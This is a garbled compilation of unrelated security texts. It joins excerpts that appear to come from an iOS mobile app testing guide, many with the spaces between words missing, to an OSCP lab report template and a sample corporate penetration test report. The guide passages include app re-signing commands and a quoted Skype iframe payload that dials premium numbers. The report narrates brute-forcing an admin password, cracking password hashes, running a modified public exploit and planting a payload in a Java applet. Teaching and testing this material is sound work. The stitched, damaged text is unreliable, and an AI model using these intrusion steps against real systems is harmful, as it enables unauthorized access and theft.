The free and open sourcetoolsMobSFandobjectionhavesomestaticanddynamicanalysisfunctionality. Additionaltoolsarelistedinthe “StaticSourceCodeAnalysis”sectionofthe“TestingTools”chapter. Don’t shy away from using automated scanners for your analysis - they help you pick low-hanging fruit and allow you tofocusonthemoreinterestingaspectsofanalysis,suchasthebusinesslogic. Keepinmindthatstaticanalyzersmay producefalsepositivesandfalsenegatives;alwaysreviewthefindingscarefully. Repackaging and Re-Signing Platform: ios Of course, tampering an app invalidates the main executable’s code signature, so this won’t run on a non-jailbroken device. You’ll need to replace the provisioning profile and sign both the main executable and the files you’ve made include(e.g.FridaGadget.dylib)withthecertificatelistedintheprofile. Repackaging First,let’saddourownprovisioningprofiletothepackage: cpAwesomeRepackaging.mobileprovisionPayload/UnCrackable\\Level\\1.app/embedded.mobileprovision Next, we need to make sure that the Bundle ID in Info.plist matches the one specified in the profile because the codesigntoolwillreadtheBundleIDfromInfo.plistduringsigning;thewrongvaluewillleadtoaninvalidsignature. /usr/libexec/PlistBuddy -c\"Set:CFBundleIdentifiersg.vantagepoint.repackage\" Payload/UnCrackable\\Level\\ 1.app/Info.plist Re-Signing Finally, we use the codesign tool to re-sign both binaries. You need to use your own signing identity (in this example 8004380F331DCA22CC1B47FB1A805890AE41C938),whichyoucanoutputbyexecutingthecommandsecurity find- identity -v. $rm -rfPayload/UnCrackable\\Level\\1.app/_CodeSignature $/usr/bin/codesign --force --sign 8004380F331DCA22CC1B47FB1A805890AE41C938 Payload/UnCrackable\\Level\\1.app/FridaGadget.dylib Payload/UnCrackableLevel1.app/FridaGadget.dylib:replacingexistingsignature entitlements.plististhefileyoucreatedforyouremptyiOSproject. $/usr/bin/codesign --force --sign 8004380F331DCA22CC1B47FB1A805890AE41C938 --entitlements entitlements.plistPayload/UnCrackable\\ Level\\1.app/UnCrackable\\ ↪ Level\\1 Payload/UnCrackableLevel1.app/UnCrackableLevel1:replacingexistingsignature Nowyoushouldbereadytorunthemodifiedapp. Deployandruntheapponthedeviceusingios-deploy: ios-deploy --debug --bundle Payload/UnCrackable\\Level\\1.app/ Ifeverythingwentwell,theappshouldstartindebuggingmodewithLLDBattached.

Decompiling Native Code Platform: ios TODO.Hopperisonlymentionedonceintheentiredocument,ghidraisonlyusedfordisassembly,...Wecanexpandthis, maybeaddsomegoodghidrasnippetsforobjective-cmapping,... Information Gathering - Network Communication Platform: ios Most of the apps you might encounter connect to remote endpoints. Even before you perform any dynamic analysis (e.g.trafficcaptureandanalysis),youcanobtainsomeinitialinputsorentrypointsbyenumeratingthedomainstowhich theapplicationissupposedtocommunicateto. Typically these domains will be present as strings within the binary of the application. One can extract domains by retrieving strings (as discussed above) or checking the strings using tools like Ghidra. The latter option has a clear advantage: it can provide you with context, as you’ll be able to see in which context each domain is being used by checkingthecross-references. Fromhereonyoucanusethisinformationtoderivemoreinsightswhichmightbeofuselaterduringyouranalysis,e.g.you couldmatchthedomainstothepinnedcertificatesorperformfurtherreconnaissanceondomainnamestoknowmore aboutthetargetenvironment. Theimplementationandverificationofsecureconnectionscanbeanintricateprocessandtherearenumerousaspects toconsider. Forinstance,manyapplicationsuseotherprotocolsapartfromHTTPsuchasXMPPorplainTCPpackets,or performcertificatepinninginanattempttodeterMITMattacks.

Retrieving Strings Platform: ios Strings are always a good starting point while analyzing a binary, as they provide context to the associated code. For instance, an error log string such as “Cryptogram generation failed” gives us a hint that the adjoining code might be responsibleforthegenerationofacryptogram. In order to extract strings from an iOS binary, you can use GUI tools such as Ghidra or iaito or rely on CLI-based tools suchasthestringsUnixutility(strings<path_to_binary>)orradare2’srabin2(rabin2-zz<path_to_binary>).

Disassembling Native Code Platform: ios BecauseObjective-CandSwiftarefundamentallydifferent,theprogramminglanguageinwhichtheappiswrittenaffects thepossibilitiesforreverseengineeringit. Forexample,Objective-Callowsmethodinvocationstobechangedatruntime. Thismakeshookingintootherappfunctions(atechniqueheavilyusedbyCycriptandotherreverseengineeringtools) easy. This“methodswizzling”isnotimplementedthesamewayinSwift,andthedifferencemakesthetechniqueharder toexecutewithSwiftthanwithObjective-C. On iOS, all the application code (both Swiftand Objective-C) is compiled to machine code (e.g. ARM). Thus, to analyze iOSapplicationsadisassemblerisneeded. IfyouwanttodisassembleanapplicationfromtheAppStore,removetheFairplayDRMfirst. Section“AcquiringtheApp Binary”inthechapter“iOSBasicSecurityTesting”explainshow. In this section the term “app binary” refers to the Macho-O file in the application bundle which contains the compiled code,andshouldnotbeconfusedwiththeapplicationbundle-theIPAfile. Seesection“ExploringtheAppPackage”in chapter“BasiciOSSecurityTesting”formoredetailsonthecompositionofIPAfiles. Disassembling With IDA Pro IfyouhavealicenseforIDAPro,youcananalyzetheappbinaryusingIDAProaswell. ThefreeversionofIDAunfortunatelydoesnotsupporttheARMprocessortype.

Oncetheauto-analysisiscompletedyoucanbrowsethedisassemblyintheIDAView(Disassembly)windowandexplore functionsintheFunctionswindow,bothshowninthescreenshotbelow. A regular IDA Pro license does not include a decompiler by default and requires an additional license for the Hex-Rays decompiler, which is expensive.

Techniquesdiscussedinthissectionaregenericandapplicableirrespectiveofthetoolsusedforanalysis. Objective-C Inadditiontothetechniqueslearnedinthe“DisassemblingandDecompiling”section,forthissectionyou’llneedsome understanding of the Objective-C runtime. For instance, functions like _objc_msgSend or _objc_release are specially meaningfulfortheObjective-Cruntime.

Theapplicationhasasinglehomescreenandausercaninteractviainputtingcustomstringsintheprovided textfield. Whentheuserinputsthewrongstring,theapplicationshowsapop-upwiththe“VerificationFailed”message. 377\\nYou can keep note of the strings displayed in the pop-up, as this might be helpful when searching for the code where the input is processed and a decision is being made. Luckily, the complexity and interaction with this application is straightforward,whichbodeswellforourreversingendeavors. Forstaticanalysisinthissection,wewillbeusingGhidra9.0.4. Ghidra9.1_betaauto-analysishasabuganddoes notshowtheObjective-Cclasses. WecanstartbycheckingthestringspresentinthebinarybyopeningitinGhidra.

Ifyoufollowthecross-references(Xrefs)ofthisstring,youwillreachbuttonClickfunctionofthe ViewControllerclass. WewilllookintothebuttonClickfunctionlaterinthissection. Whenfurthercheckingtheother strings in the application, only a few of them look a likely candidate for a hidden flag. You can try them and verify as well. 379\\nMoving forward, we have two paths to take. Either we can start analyzing the buttonClick function identified in the abovestep,orstartanalyzingtheapplicationfromthevariousentrypoints. Inrealworldsituation,mosttimesyouwill betakingthefirstpath,butfromalearningperspective,inthissectionwewilltakethelatterpath.

Theseimages aresystemlibrariesforwhichdebugsymbolsareavailableonthehostcomputertoaidinapplicationdevelopment and debugging (as part of the Xcode iOS SDK). Therefore, you may set breakpoints to these libraries directly by usingfunctionnames. Afterputtingthebreakpointandrunningtheapp, theexecutionwillbehaltedoncethebreakpointishit. Nowyoucan access and explore the current state of the process. In this case, you know from the previous static analysis that the registerX0containsthehiddenstring,thuslet’sexploreit. InLLDByoucanprintObjective-Cobjectsusingthepo(print object)command. Voila, the crackme can be easily solved aided by static analysis and a debugger. There are plethora of features im- plemented in LLDB, including changing the value of the registers, changing values in the process memory and even automatingtasksusingPythonscripts. Officially Apple recommends use of LLDB for debugging purposes, but GDB can be also used on iOS. The techniques discussedaboveareapplicablewhiledebuggingusingGDBaswell,providedtheLLDBspecificcommandsarechanged toGDBcommands.

In case you want to use these mechanisms, it is recommended to test whether the passcode has been set. In iOS 8, you will need to check whether you can read/write from an item in the Keychain protected by the kSecAttrAccessi- bleWhenPasscodeSetThisDeviceOnly attribute. From iOS 9 onward you can check whether a lock screen is set, using LAContext: Swift: public func devicePasscodeEnabled()->Bool { return LAContext().canEvaluatePolicy(.deviceOwnerAuthentication,error:nil) } Objective-C: -(BOOL)devicePasscodeEnabled:(LAContext)context{ if([contextcanEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationerror:nil]) { return true; }else { return false; } } 402\\nHere is sample Swift code you can use to create keys (Notice the kSecAttrTokenID as String: kSecAttrTokenIDSe- cureEnclave: thisindicatesthatwewanttousetheSecureEnclavedirectly.): //privatekeyparameters letprivateKeyParams =[ kSecAttrLabel asString:\"privateLabel\", kSecAttrIsPermanent asString:true, kSecAttrApplicationTag asString:\"applicationTag\", ]asCFDictionary //publickeyparameters letpublicKeyParams =[ kSecAttrLabel asString:\"publicLabel\", kSecAttrIsPermanent asString:false, kSecAttrApplicationTag asString:\"applicationTag\", ]asCFDictionary //globalparameters letparameters =[ kSecAttrKeyType asString:kSecAttrKeyTypeEC, kSecAttrKeySizeInBits asString:256, kSecAttrTokenID asString:kSecAttrTokenIDSecureEnclave, kSecPublicKeyAttrs asString:publicKeyParams, kSecPrivateKeyAttrs asString:privateKeyParams, ]asCFDictionary varpubKey,privKey:SecKey? letstatus =SecKeyGeneratePair(parameters,&pubKey,&privKey) ifstatus !=errSecSuccess { //Keyscreatedsuccessfully } Keychain Data Persistence OniOS,whenanapplicationisuninstalled,theKeychaindatausedbytheapplicationisretainedbythedevice,unlikethe datastoredbytheapplicationsandboxwhichiswiped.

Inbothcases,thebackupincludesnearlyalldatastoredontheiOSdeviceexcepthighlysensitivedata suchasApplePayinformationandTouchIDsettings. SinceiOSbacksupinstalledappsandtheirdata,anobviousconcerniswhethersensitiveuserdatastoredbytheappmight unintentionallyleakthroughthebackup. Anotherconcern,thoughlessobvious,iswhethersensitiveconfigurationsettings used to protect data or restrict app functionality could be tampered to change app behavior after restoring a modified backup. Bothconcernsarevalidandthesevulnerabilitieshaveproventoexistinavastnumberofappstoday. How the Keychain Is Backed Up When users back up their iOS device, the Keychain data is backed up as well, but the secrets in the Keychain remain encrypted. TheclasskeysnecessarytodecrypttheKeychaindataaren’tincludedinthebackup. RestoringtheKeychain datarequiresrestoringthebackuptoadeviceandunlockingthedevicewiththeuserspasscode. KeychainitemsforwhichthekSecAttrAccessibleWhenPasscodeSetThisDeviceOnly attributeissetcanbedecrypted only if the backup is restored to the backed up device. Someone trying to extract this Keychain data from the backup couldn’tdecryptitwithoutaccesstothecryptohardwareinsidetheoriginatingdevice. One caveat to using the Keychain, however, is that it was only designed to store small bits of user data or short notes (accordingtoApple’sdocumentationonKeychainServices). Thismeansthatappswithlargerlocalsecurestorageneeds (e.g.,messagingapps,etc.) shouldencryptthedatawithintheappcontainer,butusetheKeychaintostorekeymaterial. Incaseswheresensitiveconfigurationsettings(e.g.,datalosspreventionpolicies,passwordpolicies,compliancepolicies, etc)mustremainunencryptedwithintheappcontainer,youcanconsiderstoringahashofthepoliciesinthekeychain for integrity checking. Without an integrity check, these settings could be modified within a backup and then restored backtothedevicetomodifyappbehavior(e.g.,changeconfiguredremoteendpoints)orsecuritysettings(e.g.,jailbreak detection,certificatepinning,maximumUIloginattempts,etc.). The takeaway: If sensitive data is handled as recommended earlier in this chapter (e.g., stored in the Keychain, with Keychainbackedintegritychecks,orencryptedwithakeythat’slockedinsidetheKeychain),backupsshouldn’tbesecurity issue.

In other words, the user “unlocks” the app or some inner layer of functionality by providing a valid PIN, password or biometric characteristics such as face or fingerprint, which is verified by referencing local data. Generally, this is done so that userscanmoreconvenientlyresumeanexistingsessionwitharemoteserviceorasameansofstep-upauthentication toprotectsomecriticalfunction. Asstatedbeforeinchapter“MobileAppAuthenticationArchitectures”: Thetestershouldbeawarethatlocalauthentica- tionshouldalwaysbeenforcedataremoteendpointorbasedonacryptographicprimitive. Attackerscaneasilybypass localauthenticationifnodatareturnsfromtheauthenticationprocess. A variety of methods are available for integrating local authentication into apps.

SeeDon’ttouchme thatway,byDavidLindneretalformoredetails. Local Authentication Framework TheLocalAuthenticationframeworkprovidesfacilitiesforrequestingapassphraseorTouchIDauthenticationfromusers. DeveloperscandisplayandutilizeanauthenticationpromptbyutilizingthefunctionevaluatePolicyoftheLAContext class. Twoavailablepoliciesdefineacceptableformsofauthentication: • deviceOwnerAuthentication(Swift)or LAPolicyDeviceOwnerAuthentication(Objective-C):Whenavailable, the userispromptedtoperformTouchIDauthentication. IfTouchIDisnotactivated,thedevicepasscodeisrequested instead.

ThekeychainallowssavingitemswiththespecialSecAccessControlattribute,whichwillallowaccesstotheitemfrom thekeychainonlyaftertheuserhaspassedTouchIDauthentication(orpasscode,ifsuchafallbackisallowedbyattribute parameters). In the following example we will save the string “test_strong_password” to the keychain.

Most modern mobile apps use variants of HTTP-based web services, as these protocols are well-documented and sup- ported. iOS App Transport Security Starting with iOS 9, Apple introduced App Transport Security (ATS) which is a set of security checks enforced by the operatingsystemforconnectionsmadeusingtheURLLoadingSystem(typicallyviaURLSession)toalwaysuseHTTPS. AppsshouldfollowApple’sbestpracticestoproperlysecuretheirconnections. WatchATSIntroductoryVideofromtheAppleWWDC2015. ATSperformsdefaultservertrustevaluationandrequiresaminimumsetofsecurityrequirements. DefaultServerTrustEvaluation: When an app connects to a remote server, the server provides its identity using an X.509 digital certificate. The ATS defaultservertrustevaluationincludesvalidatingthatthecertificate: • Isn’texpired. • Hasanamethatmatchestheserver’sDNSname. • Has a digital signature that is valid (hasn’t been tampered with) and can be traced back to a trusted Certificate Authority(CA)includedintheoperatingsystemTrustStore, orbeinstalledontheclientbytheuserorasystem administrator.

In iOS 11 or later, Apple devices are periodically updated with a current list of revoked and constrained certificates. The list is aggregated from certificate revocation lists (CRLs), which are published by each of the built-in root certificate authorities trusted by Apple, as well as by their subordinate CA issuers. The list may also include other constraints at Apple’sdiscretion. ThisinformationisconsultedwheneveranetworkAPIfunctionisusedtomakeasecureconnection.

Additionally, vulnerabilities are easily patchedbymeansofforcedupdates. ThechallengewithiOShowever,isthatAppledoesnotprovideanyAPIsyettoautomatethisprocess,instead,developers will have to create their own mechanism, such as described at various blogs which boil down to looking up properties of the app using http://itunes.apple.com/lookup\\?id\\<BundleId> or third party libraries, such as Siren and react- native-appstore-version-checker. Most of these implementations will require a certain given version offered by an API or just “latest in the appstore”, which means users can be frustrated with having to update the app, even though no business/securityneedforanupdateistrulythere. Please note that newer versions of an application will not fix security issues that are living in the backends to which the app communicates.

Object Persistence ThereareseveralwaystopersistanobjectoniOS: Object Encoding iOScomeswithtwoprotocolsforobjectencodinganddecodingforObjective-CorNSObjects: NSCodingandNSSecure- Coding. When a class conforms to either of the protocols, the data is serialized to NSData: a wrapper for byte buffers. NotethatDatainSwiftisthesameasNSDataoritsmutablecounterpart: NSMutableData. TheNSCodingprotocoldeclares the two methods that must be implemented in order to encode/decode its instance-variables. A class using NSCoding needstoimplementNSObjectorbeannotatedasan@objcclass.

Next,whendecodingtheobject,acheckshouldbemade,e.g.: letobj=decoder.decodeObject(of:MyClass.self,forKey:\"myKey\") The conformance to NSSecureCoding ensures that objects being instantiated are indeed the ones that were expected. However,therearenoadditionalintegritychecksdoneoverthedataandthedataisnotencrypted.

Each app has a unique home directory and is sandboxed, so that they cannot access protected system resourcesorfilesstoredbythesystemorbyotherapps. Theserestrictionsareimplementedviasandboxpolicies(aka. profiles),whichareenforcedbytheTrustedBSD(MAC)MandatoryAccessControlFrameworkviaakernelextension. iOS applies a generic sandbox profile to all third-party apps called container. Access to protected resources or data (some alsoknownasappcapabilities)ispossible,butit’sstrictlycontrolledviaspecialpermissionsknownasentitlements. 442\\nSomepermissionscanbeconfiguredbytheapp’sdevelopers(e.g.DataProtectionorKeychainSharing)andwilldirectly takeeffectaftertheinstallation. However,forothers,theuserwillbeexplicitlyaskedthefirsttimetheappattemptsto accessaprotectedresource,forexample: • Bluetoothperipherals • Calendardata • Camera • Contacts • Healthsharing • Healthupdating • HomeKit • Location • Microphone • Motion • Musicandthemedialibrary • Photos • Reminders • Siri • Speechrecognition • theTVprovider EventhoughAppleurgestoprotecttheprivacyoftheuserandtobeveryclearonhowtoaskpermissions,itcanstillbe thecasethatanapprequeststoomanyofthemfornon-obviousreasons. VerifyingtheuseofsomepermissionssuchasCamera,Photos,CalendarData,Motion,ContactsorSpeechRecognition should be pretty straightforward as it should be obvious if the app requires them to fulfill its tasks. Let’s consider the following examples regarding the Photos permission, which, if granted, gives the app access to all user photos in the “CameraRoll”(theiOSdefaultsystem-widelocationforstoringphotos): • ThetypicalQRCodescanningappobviouslyrequiresthecameratofunctionbutmightberequestingthephotos permission as well. If storage is explicitly required, and depending on the sensitivity of the pictures being taken, theseappsmightbetteropttousetheappsandboxstoragetoavoidotherapps(havingthephotospermission)to accessthem. Seethechapter“DataStorageoniOS”formoreinformationregardingstorageofsensitivedata. • Some apps require photo uploads (e.g. for profile pictures). Recent versions of iOS introduce new APIs such as UIImagePickerController (iOS 11+) and its modern replacement PHPickerViewController (iOS 14+). These APIs run on a separate process from your app and by using them, the app gets read-only access exclusively to theimagesselectedbytheuserinsteadoftothewhole“CameraRoll”. Thisisconsideredabestpracticetoavoid requestingunnecessarypermissions. VerifyingotherpermissionslikeBluetoothorLocationrequireadeepersourcecodeinspection. Theymayberequiredfor theapptoproperlyfunctionbutthedatabeinghandledbythosetasksmightnotbeproperlyprotected.

For example, an app might be completely dependent on NFC to work (e.g. a “NFC Tag Reader” app). According to the archived iOS Device Compatibility Reference, NFC is only available starting on the iPhone 7 (and iOS 11).

In contrast to Android’s rich Inter-Process Communication (IPC) capability, iOS offers some rather limited options for communicationbetweenapps. Infact, there’snowayforappstocommunicatedirectly. Inthissectionwewillpresent thedifferenttypesofindirectcommunicationofferedbyiOSandhowtotestthem.

SecurityissuesarisewhenanappprocessescallstoitsURLschemewithoutproperlyvalidatingtheURLanditsparameters andwhenusersaren’tpromptedforconfirmationbeforetriggeringanimportantaction. OneexampleisthefollowingbugintheSkypeMobileapp, discoveredin2010: TheSkypeappregisteredtheskype:/ / protocol handler, which allowed other apps to trigger calls to other Skype users and phone numbers.

Attackersexploitedthisvulnerabilitybyputtinganinvisible<iframe src=\"skype://xxx?call\"></iframe> (wherexxxwasreplacedbyapremiumnumber),soanySkypeuserwhoinadvertentlyvisitedamaliciouswebsitecalled thepremiumnumber. As a developer, you should carefully validate any URL before calling it. You can allow only certain applications which maybeopenedviatheregisteredprotocolhandler.

You can obtain the effective origin by running window.origin from the JavaScript of the page (this app has an exploitation helper that allows to write and run JavaScript, but you could also implement a MITM or simply use Frida to inject JavaScript, e.g. via evaluate- JavaScript:completionHandlerofWKWebView).

For example, it might be stored or transmitted over the network, if this is the case, proper data protectionandtransportsecurityshouldbeadditionallyverified. Dynamic Analysis With help of the static analysis you should already have a list of the included permissions and app capabilities in use. However, as mentioned in “Source Code Inspection”, spotting the sensitive data and APIs related to those permissions and app capabilities might be a challenging task when you don’t have the original source code. Dynamic analysis can helpheregettinginputstoiterateontothestaticanalysis. FollowinganapproachliketheonepresentedbelowshouldhelpyouspottingthementionedsensitivedataandAPIs: 1. Consider the list of permissions / capabilities identified in the static analysis (e.g. NSLocationWhenI- nUseUsageDescription). 2. MapthemtothededicatedAPIsavailableforthecorrespondingsystemframeworks(e.g.CoreLocation). Youmay usetheAppleDeveloperDocumentationforthis. 3. TraceclassesorspecificmethodsofthoseAPIs(e.g.CLLocationManager),forexample,usingfrida-trace. 4.

Emulator Detection The goal of emulator detection is to increase the difficulty of running the app on an emulated device. This forces the reverse engineer to defeat the emulator checks or utilize the physical device, thereby barring the access required for large-scaledeviceanalysis. 514\\nAsdiscussedinthesectionTestingontheiOSSimulatorinthebasicsecuritytestingchapter,theonlyavailablesimulator istheonethatshipswithXcode.

For example, up to 5 points may be earned by submitting your lab report along with your exercises. Although submitting your PWK lab report and the corresponding course exercises is completely optional, it is not difficult to see why it’s highly recommended to do so . This document is provided as an example of what is expected, at minimum, in a typical lab report that is submitted for review. You must successfully compromise no less than 10 machines in the labs and document all of your steps as illustrated in the “Offensive Security Lab and Exam Penetration Report: Section 3 - Methodologies” template. You may choose to include more than 10 machines in your report, however this will not provide any additional points to your final exam score. The sample report presented in this document has been adapted for the non-native English speaker. For that reason, Offensive Security has opted for a more visual (i.e: more screenshots) style of reporting. A narrative of how the machine was compromised as well as vulnerability information can be included in the report, at your discretion. Please note that this template is only a guide, you may opt not to use it and create your own. The report, regardless of the template used, must be clear, concise, and most importantly, it must be reproducible. In other words, we must be able to compromise the machine again by simply following the report. 2 | P a g e\\nTable of Contents 1.0 Offensive Security Lab and Exam Penetration Test Report .............................................................. 4 1.1 Introduction ....................................................................................................................................... 4 1.2 Objective ............................................................................................................................................ 4 1.3 Requirements ..................................................................................................................................... 4 2.0 Report – High-Level Summary ......................................................................................................... 5 2.1 Report - Recommendations ............................................................................................................... 5 3.0 Report – Methodologies ................................................................................................................. 5 3.1 Report – Information Gathering ......................................................................................................... 6 3.2 Report – Service Enumeration ........................................................................................................... 6 3.3 Report – Penetration .......................................................................................................................... 7 3.4 Report – House Cleaning .................................................................................................................. 14 4.0 PWK Course Exercises ................................................................................................................... 14 3 | P a g e\\n1.0 Offensive Security Lab and Exam Penetration Test Report 1.1 Introduction The Offensive Security Lab and Exam penetration test report should contain all the steps taken to successfully compromise machines both in the exam and lab environments.

Accompanying data used in both environments should also be included, such as PoCs, custom exploit code, and so on. Please note that this report will be graded from a standpoint of correctness and completeness. The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge required to successfully achieve the Offensive Security Certified Professional (OSCP) certification. 1.2 Objective The objective of this assessment is to perform an internal penetration test against the Offensive Security Lab and Exam network. The student is tasked with following methodical approach in obtaining access to the objective goals. This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report. A sample page has been included in this document that should help you determine what is expected of you from a reporting standpoint. Please use the sample report as a guide to get you through the reporting requirement of the course. 1.3 Requirements The student will be required to complete this penetration testing report in its entirety and to include the following sections: • Overall High-Level Summary and Recommendations (Non-technical) • Methodology walk-through and detailed outline of steps taken • Each finding with accompanying screenshots, walk-throughs, sample code, and proof.txt file if applicable. • Any additional items as deemed necessary 4 | P a g e\\n2.0 Report – High-Level Summary OS-XXXXX was tasked with performing an internal penetration test in the Offensive Security Labs and Exam network. An internal penetration test is a simulated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a malicious entity, and attempt to infiltrate Offensive Security’s internal lab systems – the THINC.local domain, and the exam network. OS- XXXXX’s overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security. While conducting the internal penetration test, there were several alarming vulnerabilities that were identified within Offensive Security’s network. For example, OS-XXXXX was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations. During testing, OS-XXXXX had administrative level access to multiple systems. All systems were successfully exploited and access granted. These systems as well as a brief description on how access was obtained are listed below: • Target #1 – Obtained a low-privilege shell via the vulnerable web application called 'KikChat'. Once in, access was leveraged to escalate to 'root' using the 'getsystem' command in Meterpreter. 2.1 Report - Recommendations OS-XXXXX recommends patching the vulnerabilities identified during the penetration test to ensure that an attacker cannot exploit these systems in the future.

Below is a summary of how OS-XXXXX was able to identify and exploit a number of systems. 5 | P a g e\\n3.1 Report – Information Gathering The information gathering portion of a penetration test focuses on identifying the scope of the penetration test. During this penetration test, OS-XXXXX was tasked with exploiting the lab and exam network. The specific IP addresses were: Lab Network 192.168.31.218 3.2 Report – Service Enumeration The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable to an attacker as it provides detailed information on potential attack vectors into a system. Understanding what applications are running on the system provides an attacker with vital information before conducting the actual penetration test. In some cases, some ports may not be listed.

Often times, fragments of tools or user accounts are left on an organization’s computer, which can cause security issues down the road. Ensuring that we are meticulous and no remnants of our penetration test are left over is paramount importance. After the objectives on both the lab network and exam network were successfully completed, OS-XXXXX removed all user accounts and passwords as well as the Meterpreter services installed on the system. Offensive Security should not have to remove any user accounts or services from any of the systems. 4.0 PWK Courses Exercises Course exercises are to be documented, and added in this section of the report. 14 | P a g e",

All rights reserved. Page i\\nExecutive Summary Offensive Security was contracted by MegaCorp One to conduct a penetration test in order to determine its exposure to a targeted attack. All activities were conducted in a manner that simulated a malicious actor engaged in a targeted attack against MegaCorp One with the goals of: o Identifying if a remote attacker could penetrate MegaCorp One’s defenses o Determining the impact of a security breach on: o Confidentiality of the company’s private data o Internal infrastructure and availability of MegaCorp One’s information systems Efforts were placed on the identification and exploitation of security weaknesses that could allow a remote attacker to gain unauthorized access to organizational data. The attacks were conducted with the level of access that a general Internet user would have. The assessment was conducted in accordance with the recommendations outlined in NIST SP 800-1151 with all tests and actions being conducted under controlled conditions. 1 http://csrc.nist.gov/publications/nistpubs/800-115/SP800-115.pdf PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 1 of 34\\nSummary of Results Initial reconnaissance of the MegaCorp One network resulted in the discovery of a misconfigured DNS server that allowed a DNS zone transfer. The results provided us with a listing of specific hosts to target for this assessment. An examination of these hosts revealed a password-protected administrative webserver interface. After creating a custom wordlist using terms identified on the MegaCorp One’s website we were able to gain access to this interface by uncovering the password via brute-force. An examination of the administrative interface revealed that it was vulnerable to a remote code injection vulnerability, which was used to obtain interactive access to the underlying operating system. This initial compromise was escalated to administrative access due to a lack of appropriate system updates on the webserver. After a closer examination, we discovered that the compromised webserver utilizes a Java applet for administrative users. We added a malicious payload to this applet, which gave us interactive access to workstations used by MegaCorp One’s administrators. Using the compromised webserver as a pivot point along with passwords recovered from it, we were able to target previously inaccessible internal resources. This resulted",

Using the compromised webserver as a pivot point along with passwords recovered from it, we were able to target previously inaccessible internal resources. This resulted in Local Administrator access to numerous internal Windows hosts, complete compromise of a Citrix server, and full administrative control of the Windows Active Directory infrastructure. Existing network traffic controls were bypassed through encapsulation of malicious traffic into allowed protocols. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 2 of 34\\nAttack Narrative Remote System Discovery For the purposes of this assessment, MegaCorp One provided minimal information outside of the organizational domain name: megacorpone.com. The intent was to closely simulate an adversary without any internal information. To avoid targeting systems that were not owned by MegaCorp One, all identified assets were submitted for ownership verification before any attacks were conducted. In an attempt to identify the potential attack surface, we examined the name servers of the megacorpone.com domain name (Figure 1). Figure 1 – Information gathering for megacorpone.com reveals three active name servers. With the name servers identified, we attempted to conduct a zone transfer. We found that ns2.megacorpone.com was vulnerable to a full DNS zone transfer misconfiguration. This provided us with a listing of hostnames and associated IP addresses, which could be used to further target the organization. (Figure 2) Zone transfers can provide attackers with detailed information about the capabilities of the organization. It can also leak information about the network ranges owned by the organization. Please see Appendix A for more information. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 3 of 34\\nFigure 2 – A misconfigured name server allows a full and unrestricted DNS zone transfer. The list of identified hosts was submitted to MegaCorp One for verification, which verified that the entire 50.7.67.x network range should be included in the assessment scope. These systems were then scanned to enumerate any running services. All identified services were examined in detail to determine their potential exposure to a targeted attack. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 4 of 34\\nThrough a combination of DNS enumeration techniques and network scanning, we were able to build a composite that we feel reflects MegaCorp One’s network. The target network is shown below in Figure 3. Additional details regarding controls such as deep packet inspection were discovered later in the assessment but are included here for completeness.

We next conducted a quick enumeration scan of the system looking for common directories and files (Figure 4). Figure 4 – Enumeration of the admin.megacorpone.com host partially discloses the webserver’s folder structure. The scan results revealed that along with common Apache default files (Please see Appendix A for more information), we identified an “/admin” directory that was only accessible after authentication. (Figure 5). Figure 5 – Access to the “admin” folder is password-protected. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 6 of 34\\nTo prepare a targeted brute-force attempt against this system, we compiled a custom dictionary file based on the content of the www.megacorpone.com website. The initial dictionary consisted of 331 custom words, which were then put through several rounds of permutations and substitutions to produce a final dictionary file of 16,201 words. This dictionary file was used along with the username “admin” against the protected section of the site. Figure 6 – Using a custom word dictionary it is possible to discover the administrative password for the “admin” folder. This brute-force attack uncovered a password of “nanotechnology1” for the admin user. We were able to leverage these credentials to successfully gain unauthorized access to the protected portion of the website (Figure 6). Please see Appendix A for more information on the exploited vulnerability. The administrative portion of the website contained the SQLite Manager web interface (Figure 7), which was accessible without any additional credentials. Utilizing this interface, we found what appeared to be the database that supported an instance of phpSQLiteCMS2. Figure 7 – An instance of SQLite Manager is found to be running on the compromised webserver. 2 http://phpsqlitecms.net/ PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 7 of 34\\nThe interface gave us direct access to the data and the ability to extract a list of users on the system with the associated password hash values (Figure 8). Figure 8 – Lack of additional access controls allows an attacker to retrieve usernames and password hashes from the “userdata” database. After examination of the values, we found that the hashes did not conform to any standard format. Using a copy of the “phpselitecms” software, we examined the source code to determine exactly how this value is produced. Through this process we were able to identify the function responsible for hashing of the account passwords. Figure 9 – Source code review leads to the discovery of the password hash generation algorithm. With the newly-acquired knowledge of the password hashing format and the use of a randomly generated 10 character salt value, we were able to easily convert the recovered hashes into their salted SHA1 equivalent and conduct a brute-force attack. This effort resulted in the recovery of two plaintext passwords. Although these values were not immediately useful, they were retained in hope",

Successful exploitation of this vulnerability results in shell access to the underlying system in the context of the webserver user. Using a modified public exploit, we were able to obtain limited interactive access to the admin.megacorpone.com webserver. Please see Appendix A for more information. Figure 10 – A publicly available SQLite exploit is used to gain unauthorized access on the admin.megacorpone.com host. 3 http://www.exploit-db.com/exploits/24320/ PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 9 of 34\\nFigure 11 – Control of the vulnerable server is limited to the context of the www-data user. The public version of the exploit targets a slightly different version of the SQLite Manager than the one deployed by MegaCorp One. Although the deployed version of the software is vulnerable to the same underlying issues, the exploit does not successfully run without modification. We were able to extend the original exploit to support HTTP authentication and customize it for the updated version. A copy of this updated exploit will be provided separately from this report. The extent of compromise at this point can be best visualized in Figure 12. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved.

